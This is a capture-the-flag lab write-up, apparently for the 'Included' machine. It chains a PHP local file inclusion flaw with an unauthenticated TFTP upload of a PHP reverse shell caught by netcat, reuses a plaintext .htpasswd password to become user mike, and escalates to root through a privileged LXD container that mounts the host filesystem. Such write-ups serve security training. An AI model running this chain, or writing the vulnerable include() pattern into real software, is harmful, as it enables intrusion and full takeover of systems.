# Included

## Enumeration

```
➜  ~ nmap -sC -sV 10.129.95.185
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-29 01:21 EDT
Nmap scan report for 10.129.95.185
Host is up (0.13s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was http://10.129.95.185/?file=home.php
```

## Apache

<figure><img src=".gitbook/assets/image (30).png" alt=""><figcaption><p>Homepage</p></figcaption></figure>

The webpage features the landing page for a Gear manufacturing company. It does not seem to contain anything of interest, however, if we take a look at the URL we can see that this has automatically changed to

http://{target\_IP}/?file=home.php . This is a common way that developers use to dynamically load pages in a website and if not programmed correctly it can often lead to the webpage being vulnerable to Local File Inclusion, but more about that in a bit.

First, let's take a look at how this functionality might work.

In the above example, the code is located inside index.php , which is used to dynamically load other pages of the website by using the file variable as the control point. If this variable has not been specified in the GET request, the page automatically re-writes the URL and loads home.php . If the value has been specified, the code attempts to load a page from the value of the variable.

For instance, if the variable was file=register.php , the PHP code would attempt to load register.php from the same folder.

This is a good way to seamlessly load different web pages, however if the include command is not restricted to just the web directory (e.g. /var/www/html ), it might be possible to abuse it in order to read any file that is available on the system and the user who is running the web server has privileges to read.

This is what is called a Local File Inclusion vulnerability and is defined as follows.

```bash
if ($_GET['file']) {
  include($_GET['file']);
  } else {
  header("Location: http://$_SERVER[HTTP_HOST]/index.php?file=home.php");
}
```

```
Local file inclusion (also known as LFI) is the process of including files, that are
already locally present on the server, through the exploitation of vulnerable inclusion
procedures implemented in an application.
```

We can easily determine if this is the case by attempting to load a file that we know definitely exists on the system and is readable by all users. One of those files is /etc/passwd and to load it, change the file parameter from home.php to /etc/passwd . For consistency reasons we will show this process with the cURL command line utility instead of a browser.

```
curl 'http://10.129.95.185/?file=/etc/passwd'
```

<figure><img src=".gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

This is successful and a list of users is returned.

It is worth noting that inputting /etc/passwd might not always work if the inclusion already specifies a working directory.

For instance, consider the following code.

```bash
if ($_GET['file']) {
  include( __DIR__ . $_GET['file']);
} else {
  header("Location: http://$_SERVER[HTTP_HOST]/index.php?file=home.php");
}
```

In this example the \_\_DIR\_\_ parameter is used to acquire the current working directory that the script is located in (e.g. /var/www/html ) and then the value of the file variable is concatenated at the end. If we were to input /etc/passwd the full path would become /var/www/html/etc/passwd , which would result in a blank page as there is no such file or folder on the system.

To bypass this restriction, we would have to instruct the code to search in previous directories. This would work similarly to how navigating to a previous folder is done with the cd command.

<figure><img src=".gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

In such a case, /etc/passwd would become ../../../etc/passwd .

```
➜  ~ sudo nmap -sU 10.129.95.185
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-29 01:34 EDT
Nmap scan report for 10.129.95.185
Host is up (0.14s latency).
Not shown: 997 closed udp ports (port-unreach)
PORT    STATE         SERVICE
68/udp  open|filtered dhcpc
69/udp  open|filtered tftp
997/udp open|filtered maitrd

Nmap done: 1 IP address (1 host up) scanned in 1086.36 seconds
```

What service is running on the target machine over UDP? <mark style="background-color:green;">TFTP</mark>

What class of vulnerability is the webpage that is hosted on port 80 vulnerable to? <mark style="background-color:green;">Local File Inclusion</mark>

## TFTP

Back to the task at hand, while a Local File Inclusion is a great way to gather information and read system files the goal of every Penetration Tester is to achieve Remote Code Execution on a system. There is a plethora of ways that an LFI can turn into RCE, from log poisoning to plaintext passwords in configuration files and forgotten backups, however in this case the passwd file gave us a big hint as to how to proceed.

The last user that is listed is called tftp .\
tftp:x:110:113:tftp daemon,,,:/var/lib/tftpboot:/usr/sbin/nologin

A quick Google search reveals that Trivial File Transfer Protocol (TFTP) is a simple protocol that provides basic file transfer function with no user authentication. TFTP is intended for applications that do not need the sophisticated interactions that File Transfer Protocol (FTP) provides.

It is also revealed that TFTP uses the User Datagram Protocol (UDP) to communicate. This is defined as a lightweight data transport protocol that works on top of IP.

```
UDP provides a mechanism to detect corrupt data in packets, but it does not attempt to
solve other problems that arise with packets, such as lost or out of order packets.
It is implemented in the transport layer of the OSI Model, known as a fast but not
reliable protocol, unlike TCP, which is reliable, but slower then UDP.
```

```
Just like how TCP contains open ports for protocols such as HTTP, FTP, SSH and
etcetera, the same way UDP has ports for protocols that work for UDP.
```

To this end let's use Nmap to scan for open UDP ports. It is worth noting that a UDP scan takes considerably longer time to complete compared to a TCP scan and it also requires superuser privileges.

The scan reveals that port 69 UDP is open and an instance of the TFTP server is running on it. In order to communicate with TFTP, we need to install it on our Linux machine.

<figure><img src=".gitbook/assets/image (33).png" alt=""><figcaption><p>Screenshot of TFTP man page</p></figcaption></figure>

## Foothold

TFTP works by default without the need for authentication. That means that anyone can connect to the TFTP server and upload or download files from the remote system.

We can chain this with the LFI vulnerability that we have already identified, in order to upload malicious PHP code to the target system that will be responsible for returning a reverse shell to us. We will then access this PHP file through the LFI and the web server will execute the PHP code.

We can either create our own PHP code or use one of the many available PHP reverse shells that can be found online through a Google search. One of them can be found here.

Copy the code and place it inside a file called shell.php . Then open it using a text editor such as nano or vim and edit the following lines.

The $port variable specifies the local port that we will use to catch the reverse shell. This can be anything we want as long as it is not already being used by a local process. Let's leave it to 1234 .

The $ip variable specifies the local IP address that the shell will be returned to. We can acquire this IP by running the ifconfig command and looking under tun0 . The IP will be in the form of 10.10.14.X .

After acquiring the local IP, change it in the PHP shell and save it. Then we will upload the file to the remote TFTP server.

<figure><img src=".gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

Now that the file has been uploaded, we need to start a local Netcat listener on the port that we specified in the reverse shell, in order to catch the connection once it initiates.

nc -lvp 4444

Finally, we must find a way to access the uploaded PHP file through the LFI but we do not know where the file is uploaded on the target system. Thinking back to the passwd file that we read earlier, the TFTP user's home folder is specified as /var/lib/tftpboot .

```
  tftp:x:110:113:tftp daemon,,,:/var/lib/tftpboot:/usr/sbin/nologin
```

This information can also be found with a quick Google search.

```
The default configuration file for tftpd-hpa is /etc/default/tftpd-hpa. The default
root directory where files will be stored is /var/lib/tftpboot
```

With this information let's try to load /var/lib/tftpboot/shell.php .&#x20;

curl 'http://10.129.95.185/?file=/var/lib/tftpboot/shell.php'

Once this command is run our terminal will appear stuck, however our Netcat listener has caught a connection.

<figure><img src=".gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

The received shell is not fully interactive, however we can make it a bit better by using Python3.

```
  python3 -c 'import pty;pty.spawn("/bin/bash")'
```

## Lateral Movement

With access to the system as the www-data user we do not have enough privileges to read the user flag, therefore we need to find a way to move laterally to user mike who was also found on the passwd file. A good place to start our enumeration would be the web server directory as it often contains configuration files that might include passwords.

The web-related files are usually stored in the /var/www/html folder, so that's where we are going start.

<figure><img src=".gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

The folder contains two interesting hidden files, .htaccess and .htpasswd . The htpasswd file is used to store usernames and passwords for basic authentication of HTTP users. Let's read both files.

```bash
www-data@included:/var/www/html$ cat .htaccess
cat .htaccess
RewriteEngine On
RewriteCond %{THE_REQUEST} ^GET.*index\.php [NC]
RewriteRule (.*?)index\.php/*(.*) /$1$2 [R=301,NE,L]
#<Files index.php>
#AuthType Basic
#AuthUserFile /var/www/html/.htpasswd
#Require valid-user
www-data@included:/var/www/html$ cat .htpasswd
cat .htpasswd
mike:Sheffield19
```

The second file contains credentials for user Mike. Often times users re-use the same passwords for multiple services and accounts and compromising one of them might mean that all of them are compromised.

If user Mike has used the same password for their system account, we might be able to use the su utility to acquire a shell with their privileges.

```bash
www-data@included:/var/www/html$ su mike
su mike
Password: Sheffield19

mike@included:/var/www/html$
```

## Privilege escalation

The next step is escalating to the root user in order to gain the highest privileges on the system. Looking at the groups that user Mike is a member of, the lxd group is listed.

A quick Google search on what LXD is reveals the following information.

Digging a little deeper into LXD and searching for the keywords LXD Exploit on Google reveals the following information.

```
LXD is a management API for dealing with LXC containers on Linux systems. It will
perform tasks for any members of the local lxd group. It does not make an effort to
match the permissions of the calling user to the function it is asked to perform.
```

```
A member of the local “lxd” group can instantly escalate the privileges to root on the
host operating system. This is irrespective of whether that user has been granted sudo
rights and does not require them to enter their password. The vulnerability exists even
with the LXD snap package.
```

This is exactly what we need and this HackTricks page describes the whole exploitation process step by step. The exploit works by making use of the Alpine image, which is a lightweight Linux distribution based on busy box. After this distribution is downloaded and built locally, an HTTP server is used to upload it to the remote system. The image is then imported into LXD and it is used to mount the Host file system with root privileges.

Let's begin by installing the Go programming language as well as some other required packages.

sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools Then we must clone the LXC Distribution Builder and build it.

Note: If the above make command produces errors and fails to build the distrobuilder binary, you can also install it via the Snap store, as follows:

After the build is complete let's download the Alpine YAML file and build it.

Note: If you installed the binary via the Snap store, replace the final sudo command with the following:

sudo /snap/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18 Once the build is done lxd.tar.xz and rootfs.squashfs will be available in the same folder.

```
git clone https://github.com/lxc/distrobuilder
cd distrobuilder
make
```

```
sudo apt install snapd
sudo snap install distrobuilder --classic
```

```
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18
```

We will now have to transfer these files to the target system through the usage of a Python HTTP server. Run the following command locally on the same folder.

python3 -m http.server 8000\
Then switch back to the reverse shell on the target system and download the files.

Note: As shown previously the local IP can be acquired through the ifconfig command line utility. Once the transfer finishes, use the ls command to confirm the files transferred successfully.

```
wget http://{local_IP}:8000/lxd.tar.xz
wget http://{local_IP}:8000/rootfs.squashfs
```

The next step is to import the image using the LXC command-line tool.

lxc image import lxd.tar.xz rootfs.squashfs --alias alpine\
To verify that the image has been successfully imported we can list the LXD images.

```
  lxc image list
```

Alpine is correctly shown in the image list. We must now set the security.privileged flag to true, so that the container has all of the privileges that the root file system has. We will also mount the root file system on the container in the /mnt folder.

```
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

Finally we can start the container and start a root shell inside it.

```
lxc start privesc
lxc exec privesc /bin/sh
```

To access the root flag, we can navigate to the /mnt/root/root folder.

We successfully got the flag, congratulations!

user flag a56ef91d70cfbf2cdb8f454c006935a1
